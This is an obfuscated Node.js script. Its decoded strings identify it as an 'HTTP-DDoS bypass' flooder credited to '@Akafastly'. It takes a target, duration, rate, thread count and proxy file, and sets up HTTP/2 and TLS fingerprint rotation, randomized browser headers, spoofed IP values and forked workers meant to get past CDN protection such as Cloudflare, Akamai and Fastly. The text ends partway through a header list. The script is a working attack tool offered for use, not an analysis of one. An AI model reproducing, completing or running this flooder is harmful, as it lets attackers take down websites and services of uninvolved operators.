var _0xodH = 'jsjiami.com.v6',
    _0xodH_ = function () {
        return ['‮_0xodH'], _0x2e92 = [_0xodH, 'QmxhY2tCZXJyeSBPUw==', 'aGVsbG8gY2xvdWRmbGFyZQ==', 'aGVsbG8gY2xpZW50', 'aGVsbG8gd29ybGQ=', 'aGVsbG8gYWthbWFp', 'aGVsbG8gY2RuZmx5', 'aGVsbG8ga2l0dHk=', 'cHJveHlGaWxl', 'cGFyc2U=', 'dGFyZ2V0', 'RmVlZA==', 'R0VU', 'aHR0cC8xLjE9aHR0cDIu', 'aG9zdA==', 'OyBtYT03MjAw', 'MTAwLWNvbnRpbnVl', 'Zm9yPTE5Mi4xNjguMC4xO3Byb3RvPWh0dHA7Ynk9', 'dXNlckBnbWFpbC5jb20=', 'aHR0cHM6Ly8=', 'dHJ1ZQ==', 'aXNNYXN0ZXI=', 'VGltZTog', 'Zm9yaw==', 'SFRUUA==', 'SFRUUC8xLjEgMjAw', 'ZXJyb3I6IGludmFsaWQgcmVzcG9uc2UgZnJvbSBwcm94eSBzZXJ2ZXI=', 'ZXJyb3I6IHRpbWVvdXQgZXhjZWVkZWQ=', 'TXhiVXA=', 'ZXJyb3I6IA==', 'Q09OTkVDVCA=', 'OjQ0MyBIVFRQLzEuMQ0KSG9zdDog', 'Y29ubmVjdA==', 'dGltZW91dA==', 'ZXJyb3I=', 'TG55UUM=', 'aVJSVnI=', 'TERGZ1c=', 'SlNkb00=', 'YWRkcmVzcw==', 'ZnJvbQ==', 'c2V0VGltZW91dA==', 'UURnWG4=', 'c2V0S2VlcEFsaXZl', 'bmRPSm0=', 'Q3dzRGo=', 'UW5lV1o=', 'T2NrV0I=', 'V2tNbkQ=', 'SEJ5ZWE=', 'elhwYUE=', 'VkNOb1E=', 'aW5jbHVkZXM=', 'QlNuTnc=', 'ZmNCUXM=', 'Ulp1T3o=', 'T3lXc1U=', 'a0xlVHE=', 'cURLS0o=', 'VXZBVUg=', 'VFlnRmg=', 'S0h4ZVc=', 'cGF0aA==', 'cmVwbGFjZQ==', 'Om1ldGhvZA==', 'OnBhdGg=', 'OnNjaGVtZQ==', 'aHR0cHM=', 'b0dMVUU=', 'b0lyQ3k=', 'cmVzcG9uc2U=', 'dm5aSWQ=', 'WDI1NTE5', 'VExTX21ldGhvZA==', 'UUtFR0Q=', 'OjQ0Mw==', 'QXJxZXE=', 'b1NGc1c=', 'cUdUZ0I=', 'VU9IUFQ=', 'S1JCVnU=', 'aHJlZg==', 'aHR0cHM6', 'Z0NVZGI=', 'Q0VUc08=', 'eUFQeUw=', 'SGhqZEs=', 'S1BqQ3I=', 'dElscEw=', 'RFJPYng=', 'cmVxdWVzdA==', 'eEpzbFU=', 'S1lqTFY=', 'cGhaRlE=', 'akx0bWs=', 'WElObG4=', 'UmF0ZQ==', 'Y29uc3RhbnRz', 'TkdIVFRQMl9DQU5DRUw=', 'ZW5k', 'cmVhZEZpbGVTeW5j', 'WlFpY1E=', 'YXZ2b2o=', 'ZkF3Z1Q=', 'ZVdsc2Q=', 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk=', 'ZGtCTkE=', 'dGltZQ==', 'bmV0', 'aHR0cDI=', 'dGxz', 'Y3J5cHRv', 'Y29sb3Jz', 'c2V0TWF4TGlzdGVuZXJz', 'ZXZlbnRz', 'RXZlbnRFbWl0dGVy', 'ZGVmYXVsdE1heExpc3RlbmVycw==', 'dW5jYXVnaHRFeGNlcHRpb24=', 'bGVuZ3Ro', 'bG9n', 'VXNhZ2U6IHRhcmdldCB0aW1lIHJhdGUgdGhyZWFkIHByb3h5ZmlsZQ==', 'ZXhpdA==', 'dXRmLTg=', 'clNZYW8=', 'dG9TdHJpbmc=', 'c3BsaXQ=', 'bUhMa2s=', 'TUlEbE0=', 'akJ4dkg=', 'cVVVSXU=', 'TkVFV0Y=', 'THZCTGk=', 'VXV2TUU=', 'cnN0U3RyZWFt', 'd3JpdGU=', 'Y2xvc2U=', 'ZGVzdHJveQ==', 'Y2hhckF0', 'V1F4VUQ=', 'Zmxvb3I=', 'V2Z6S3I=', 'Tm9rYm0=', 'a05PTHk=', 'UlZxZ0k=', 'cmFuZG9t', 'SlNjWmI=', 'bENBbmY=', 'UHpmd1Q=', 'Y2xlYXI=', 'SFRUUC1ERG9TIGJ5cGFzcyBieTogQEFrYWZhc3RseSAoU3hweSBBemFyeSk=', 'cmFpbmJvdw==', 'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0=', 'Z1liTU0=', 'VGFyZ2V0OiA=', 'YXJndg==', 'YnJpZ2h0WWVsbG93', 'UmF0ZTog', 'VGhyZWFkOiA=', 'UHJveHlGaWxlOiA=', 'Z3JheQ==', 'Tm90ZTog', 'YnJpZ2h0Q3lhbg==', 'dGhyZWFkcw==', 'bGNQdUM=', 'cnNhX3Bzc19yc2FlX3NoYTI1Ng==', 'cnNhX3Bzc19yc2FlX3NoYTM4NA==', 'cnNhX3Bzc19yc2FlX3NoYTUxMg==', 'cnNhX3BrY3MxX3NoYTI1Ng==', 'cnNhX3BrY3MxX3NoYTM4NA==', 'cnNhX3BrY3MxX3NoYTUxMg==', 'am9pbg==', 'RUNESEUtUlNBLUFFUzEyOC1HQ00tU0hBMjU2', 'c3RyaW5naWZ5', 'Y2YtbmVs', 'ZGVmYXVsdA==', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjg=', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOA==', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44LGVuO3E9MC43', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgsYXBwbGljYXRpb24vcnNzK3htbDtxPTAuOQ==', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgsYXBwbGljYXRpb24vanNvbjtxPTAuOQ==', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgsYXBwbGljYXRpb24vbGQranNvbjtxPTAuOQ==', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgsYXBwbGljYXRpb24veG1sLWR0ZDtxPTAuOQ==', 'dGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgsdGV4dC94bWw7cT0wLjk=', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgsdGV4dC9wbGFpbjtxPTAuOA==', 'dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA==', 'a28tS1I=', 'ZW4tVVM=', 'emgtQ04=', 'emgtVFc=', 'amEtSlA=', 'ZW4tR0I=', 'ZW4tQVU=', 'ZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjg=', 'ZW4tQ0E=', 'ZW4tVUssIGVuLCBkZTtxPTAuNQ==', 'ZW4tTlo=', 'ZW4tR0IsZW47cT0wLjY=', 'ZW4tWkE=', 'ZW4tSEs=', 'ZW4tR0IsZW47cT0wLjg=', 'IGVuLUdCLGVuO3E9MC43', 'ZW4tVVMsZW47cT0wLjU=', 'dXRmLTgsIGlzby04ODU5LTE7cT0wLjUsICo7cT0wLjE=', 'ZnItQ0gsIGZyO3E9MC45LCBlbjtxPTAuOCwgZGU7cT0wLjcsICo7cT0wLjU=', 'ZGUtQVQsIGRlLURFO3E9MC45LCBlbjtxPTAuNQ==', 'ZGEsIGVuLWdiO3E9MC44LCBlbjtxPTAuNw==', 'aGUtSUwsaGU7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjc=', 'ZW4tVVMsZW47cT0wLjk=', 'Z3ppcA==', 'Z3ppcCwgZGVmbGF0ZSwgYnI=', 'ZGVmbGF0ZSwgZ3ppcA==', 'Z3ppcCwgaWRlbnRpdHk=', 'YnI7cT0xLjAsIGd6aXA7cT0wLjgsICo7cT0wLjE=', 'Z3ppcDtxPTEuMCwgaWRlbnRpdHk7IHE9MC41LCAqO3E9MA==', 'Y29tcHJlc3M7cT0wLjUsIGd6aXA7cT0xLjA=', 'aWRlbnRpdHk=', 'Z3ppcCwgY29tcHJlc3M=', 'ZGVmbGF0ZQ==', 'Z3ppcCwgZGVmbGF0ZSwgbHptYSwgc2RjaA==', 'bWF4LWFnZT02MDQ4MDA=', 'cHJveHktcmV2YWxpZGF0ZQ==', 'bWF4LWFnZT0zMTUzNjAwMDA=', 'cHVibGljLCBtYXgtYWdlPTg2NDAwLCBzdGFsZS13aGlsZS1yZXZhbGlkYXRlPTYwNDgwMCwgc3RhbGUtaWYtZXJyb3I9NjA0ODAw', 'bWF4LXN0YWxl', 'bXVzdC1yZXZhbGlkYXRl', 'cHJpdmF0ZSwgbWF4LWFnZT0wLCBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MA==', 'bWF4LWFnZT0zMTUzNjAwMCxwdWJsaWMsaW1tdXRhYmxl', 'bWF4LWFnZT0zMTUzNjAwMCxwdWJsaWM=', 'bWluLWZyZXNo', 'cy1tYXhhZ2U=', 'bm8tY2FjaGU=', 'bm8tY2FjaGUsIG5vLXRyYW5zZm9ybQ==', 'bm8tc3RvcmU=', 'bm8tdHJhbnNmb3Jt', 'bWF4LWFnZT0zMTU1NzYwMA==', 'bWF4LWFnZT0w', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNS4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNC4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMy4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNC4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMy4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMS4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOC4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTYuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGdlLzEyLjA=', 'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE1LjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE0LjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEzLjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTEuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGdlLzEyLjA=', 'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEyLjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTExLjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4zOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE1LjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNS4wLjAuMCBTYWZhcmkvNTM3LjM2', 'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTNfNV8xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE2LjAuMC4wIFNhZmFyaS81MzcuMzY=', 'TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTNfNV8xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE0LjAuMC4wIFNhZmFyaS81MzcuMzY=', 'dXNlIHByZW1pdW0gcHJveHkgd2lsbCBnZXQgbW9yZSByZXF1ZXN0L3M=', 'dGhpcyBzY3JpcHQgb25seSB3b3JrIG9uIGh0dHAvMiE=', 'cmVjb21tZW5kZWQgYmlnIHByb3h5ZmlsZSBpZiB0YXJnZXQgaXMgYWthbWFpL2Zhc3RseQ==', 'ZG9udCB0cnlpbmcgcmVzZWxsIG15IHNjcmlwdCEhIEBBa2FmYXN0bHk=', 'TWFjIE9T', 'aVBhZE9T', 'jdAskpdyjitDkDBamiZ.cZGNom.v6=='];
    }();
if (function (_0x1ed61e, _0x5dbd2d, _0x344574) {
        function _0x13b906(_0x1e6620, _0xc43488, _0x3bf282, _0x26a82e, _0x47433c, _0x1c814f) {
            _0xc43488 = _0xc43488 >> 0x8, _0x47433c = 'po';
            var _0x3a3676 = 'shift',
                _0xe6a2f = 'push',
                _0x1c814f = '‮';
            if (_0xc43488 < _0x1e6620) {
                while (--_0x1e6620) {
                    _0x26a82e = _0x1ed61e[_0x3a3676]();
                    if (_0xc43488 === _0x1e6620 && _0x1c814f === '‮' && _0x1c814f['length'] === 0x1) {
                        _0xc43488 = _0x26a82e, _0x3bf282 = _0x1ed61e[_0x47433c + 'p']();
                    } else if (_0xc43488 && _0x3bf282['replace'](/[dAkpdytDkDBZZGN=]/g, '') === _0xc43488) {
                        _0x1ed61e[_0xe6a2f](_0x26a82e);
                    }
                }
                _0x1ed61e[_0xe6a2f](_0x1ed61e[_0x3a3676]());
            }
            return 0x13e44c;
        };
        return _0x13b906(++_0x5dbd2d, _0x344574) >> _0x5dbd2d ^ _0x344574;
    }(_0x2e92, 0x175, 0x17500), _0x2e92) {
    _0xodH_ = _0x2e92['length'] ^ 0x175;
};

function _0x38af(_0x452231, _0xa6fa0a) {
    _0x452231 = ~~'0x' ['concat'](_0x452231['slice'](0x1));
    var _0x23aac6 = _0x2e92[_0x452231];
    if (_0x38af['HgAgvs'] === undefined && '‮' ['length'] === 0x1) {
        (function () {
            var _0x5af3fb = typeof window !== 'undefined' ? window : typeof process === 'object' && typeof require === 'function' && typeof global === 'object' ? global : this;
            var _0xbf3481 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            _0x5af3fb['atob'] || (_0x5af3fb['atob'] = function (_0xf661d9) {
                var _0x5066af = String(_0xf661d9)['replace'](/=+$/, '');
                for (var _0x401468 = 0x0, _0x3e726b, _0x2accb4, _0x133161 = 0x0, _0x2d77b0 = ''; _0x2accb4 = _0x5066af['charAt'](_0x133161++); ~_0x2accb4 && (_0x3e726b = _0x401468 % 0x4 ? _0x3e726b * 0x40 + _0x2accb4 : _0x2accb4, _0x401468++ % 0x4) ? _0x2d77b0 += String['fromCharCode'](0xff & _0x3e726b >> (-0x2 * _0x401468 & 0x6)) : 0x0) {
                    _0x2accb4 = _0xbf3481['indexOf'](_0x2accb4);
                }
                return _0x2d77b0;
            });
        }());
        _0x38af['CARMFk'] = function (_0x2664e4) {
            var _0x1a6b30 = atob(_0x2664e4);
            var _0x314a40 = [];
            for (var _0x1bcba2 = 0x0, _0x2fb72d = _0x1a6b30['length']; _0x1bcba2 < _0x2fb72d; _0x1bcba2++) {
                _0x314a40 += '%' + ('00' + _0x1a6b30['charCodeAt'](_0x1bcba2)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(_0x314a40);
        };
        _0x38af['nqEJlE'] = {};
        _0x38af['HgAgvs'] = !![];
    }
    var _0x58d34b = _0x38af['nqEJlE'][_0x452231];
    if (_0x58d34b === undefined) {
        _0x23aac6 = _0x38af['CARMFk'](_0x23aac6);
        _0x38af['nqEJlE'][_0x452231] = _0x23aac6;
    } else {
        _0x23aac6 = _0x58d34b;
    }
    return _0x23aac6;
};
const net = require(_0x38af('‮0'));
const http2 = require(_0x38af('‮1'));
const tls = require(_0x38af('‮2'));
const cluster = require('cluster');
const url = require('url');
const crypto = require(_0x38af('‮3'));
const fs = require('fs');
const colors = require(_0x38af('‮4'));
process[_0x38af('‫5')](0x0);
require(_0x38af('‮6'))[_0x38af('‫7')][_0x38af('‮8')] = 0x0;
process['on'](_0x38af('‮9'), function (_0x4e178a) {});
if (process['argv'][_0x38af('‮a')] < 0x7) {
    console[_0x38af('‮b')](_0x38af('‫c'));
    process[_0x38af('‫d')]();
}
const headers = {};

function readLines(_0x5e604d) {
    var _0x22d754 = {
        'rSYao': _0x38af('‫e')
    };
    return fs['readFileSync'](_0x5e604d, _0x22d754[_0x38af('‮f')])[_0x38af('‫10')]()[_0x38af('‫11')](/\r?\n/);
}

function randomIntn(_0xf64ba6, _0x18cb3a) {
    var _0x1bda18 = {
        'woOnI': function (_0x1143ad, _0xd74155) {
            return _0x1143ad + _0xd74155;
        },
        'mHLkk': function (_0x422285, _0x4b604e) {
            return _0x422285 * _0x4b604e;
        },
        'MIDlM': function (_0x4a3dc8, _0x3d3cdf) {
            return _0x4a3dc8 - _0x3d3cdf;
        }
    };
    return Math['floor'](_0x1bda18['woOnI'](_0x1bda18[_0x38af('‮12')](Math['random'](), _0x1bda18[_0x38af('‮13')](_0x18cb3a, _0xf64ba6)), _0xf64ba6));
}

function randomElement(_0x3a20ae) {
    var _0x267d1c = {
        'jBxvH': function (_0x15ad84, _0x590251, _0x1b18b1) {
            return _0x15ad84(_0x590251, _0x1b18b1);
        }
    };
    return _0x3a20ae[_0x267d1c[_0x38af('‫14')](randomIntn, 0x0, _0x3a20ae[_0x38af('‮a')])];
}

function randstr(_0x26dec8) {
    var _0x321331 = {
        'OQaIw': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
        'LvBLi': function (_0x208069, _0x32ffe2) {
            return _0x208069 < _0x32ffe2;
        },
        'UzxTh': _0x38af('‫15'),
        'UuvME': _0x38af('‫16'),
        'WQxUD': function (_0x59493a, _0x13f02f) {
            return _0x59493a * _0x13f02f;
        }
    };
    const _0x174e21 = _0x321331['OQaIw'];
    let _0x1ef81a = '';
    const _0x4eab86 = _0x174e21[_0x38af('‮a')];
    for (let _0x840ca5 = 0x0; _0x321331[_0x38af('‮17')](_0x840ca5, _0x26dec8); _0x840ca5++) {
        if (_0x321331['UzxTh'] === _0x321331[_0x38af('‮18')]) {
            request[_0x38af('‫19')](http2['constants']['NGHTTP2_CANCEL']);
            request[_0x38af('‮1a')](random);
            request[_0x38af('‫1b')]();
            request[_0x38af('‫1c')]();
            return;
        } else {
            _0x1ef81a += _0x174e21[_0x38af('‮1d')](Math['floor'](_0x321331[_0x38af('‮1e')](Math['random'](), _0x4eab86)));
        }
    }
    return _0x1ef81a;
}
const ip_spoof = () => {
    var _0x4db2ef = {
        'JwSpl': function (_0x4e3682, _0xf6381b) {
            return _0x4e3682 * _0xf6381b;
        },
        'WfzKr': function (_0x5ca6d3) {
            return _0x5ca6d3();
        },
        'Nokbm': function (_0x4d2ba8) {
            return _0x4d2ba8();
        }
    };
    const _0x3d61ee = () => {
        return Math[_0x38af('‫1f')](_0x4db2ef['JwSpl'](Math['random'](), 0xff));
    };
    return _0x4db2ef[_0x38af('‫20')](_0x3d61ee) + '.' + _0x4db2ef[_0x38af('‫21')](_0x3d61ee) + '.' + _0x4db2ef[_0x38af('‫21')](_0x3d61ee) + '.' + _0x3d61ee();
};
const spoofed = ip_spoof();
const ip_spoof2 = () => {
    var _0x139c5a = {
        'LDjUQ': function (_0x2db1c3, _0x4dc4b8) {
            return _0x2db1c3 === _0x4dc4b8;
        },
        'CMjTX': _0x38af('‫22'),
        'ZkqFf': 'IQQxQ',
        'RVqgI': function (_0x34c316, _0x275408) {
            return _0x34c316 * _0x275408;
        }
    };
    const _0x29456c = () => {
        if (_0x139c5a['LDjUQ'](_0x139c5a['CMjTX'], _0x139c5a['ZkqFf'])) {
            setInterval(runFlooder);
        } else {
            return Math[_0x38af('‫1f')](_0x139c5a[_0x38af('‮23')](Math[_0x38af('‫24')](), 0x270f));
        }
    };
    return '' + _0x29456c();
};
const spoofed2 = ip_spoof2();
const ip_spoof3 = () => {
    var _0x48f1d1 = {
        'gYbMM': function (_0x291fb7, _0x425c2e) {
            return _0x291fb7 + _0x425c2e;
        },
        'vPNtZ': function (_0x4b43ee, _0x4681cc) {
            return _0x4b43ee === _0x4681cc;
        },
        'qEYjY': _0x38af('‮25'),
        'PzfwT': _0x38af('‮26'),
        'lcPuC': function (_0x54d63c, _0x1aacbd) {
            return _0x54d63c * _0x1aacbd;
        },
        'QAzhz': function (_0x1cc09a) {
            return _0x1cc09a();
        }
    };
    const _0x38c6ad = () => {
        if (_0x48f1d1['vPNtZ'](_0x48f1d1['qEYjY'], _0x48f1d1[_0x38af('‫27')])) {
            console[_0x38af('‫28')]();
            console['log'](_0x38af('‮29')[_0x38af('‮2a')]);
            console['log'](_0x38af('‫2b')['gray']);
            console[_0x38af('‮b')](_0x48f1d1[_0x38af('‮2c')](_0x38af('‫2d')['brightYellow'], process[_0x38af('‫2e')][0x2]));
            console[_0x38af('‮b')](_0x48f1d1['gYbMM']('Time: ' [_0x38af('‫2f')], process['argv'][0x3]));
            console[_0x38af('‮b')](_0x38af('‮30')[_0x38af('‫2f')] + process['argv'][0x4]);
            console[_0x38af('‮b')](_0x48f1d1[_0x38af('‮2c')](_0x38af('‮31')[_0x38af('‫2f')], process[_0x38af('‫2e')][0x5]));
            console['log'](_0x38af('‮32')[_0x38af('‫2f')] + process[_0x38af('‫2e')][0x6]);
            console[_0x38af('‮b')](_0x38af('‫2b')[_0x38af('‫33')]);
            console['log'](_0x48f1d1[_0x38af('‮2c')](_0x38af('‫34')[_0x38af('‫35')], tipsz));
            for (let _0x162c72 = 0x1; _0x162c72 <= args[_0x38af('‮36')]; _0x162c72++) {
                cluster['fork']();
            }
        } else {
            return Math[_0x38af('‫1f')](_0x48f1d1[_0x38af('‫37')](Math[_0x38af('‫24')](), 0x76));
        }
    };
    return '' + _0x48f1d1['QAzhz'](_0x38c6ad);
};
const spoofed3 = ip_spoof3();
const args = {
    'target': process['argv'][0x2],
    'time': parseInt(process[_0x38af('‫2e')][0x3]),
    'Rate': parseInt(process[_0x38af('‫2e')][0x4]),
    'threads': parseInt(process['argv'][0x5]),
    'proxyFile': process[_0x38af('‫2e')][0x6]
};
const sig = [_0x38af('‫38'), _0x38af('‫39'), _0x38af('‫3a'), _0x38af('‮3b'), _0x38af('‮3c'), _0x38af('‫3d')];
const sigalgs1 = sig[_0x38af('‫3e')](':');
const cplist = [_0x38af('‮3f'), 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256'];
const val = {
    'NEl': JSON[_0x38af('‮40')]({
        'report_to': Math[_0x38af('‫24')]() < 0.5 ? _0x38af('‫41') : _0x38af('‫42'),
        'max-age': Math[_0x38af('‫24')]() < 0.5 ? 0x93a80 : 0x2713e8,
        'include_subdomains': Math[_0x38af('‫24')]() < 0.5 ? !![] : ![]
    })
};
const accept_header = [_0x38af('‫43'), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,**;q=0.8', _0x38af('‫45'), 'text/html,application/xhtml+xml,application/xml;q=0.9,**;q=0.8,application/signed-exchange;v=b3', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,**;q=0.8,application/atom+xml;q=0.9', _0x38af('‫47'), _0x38af('‮48'), _0x38af('‫49'), _0x38af('‫4a'), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,**', _0x38af('‫4c'), _0x38af('‫4d'), _0x38af('‮4e')];
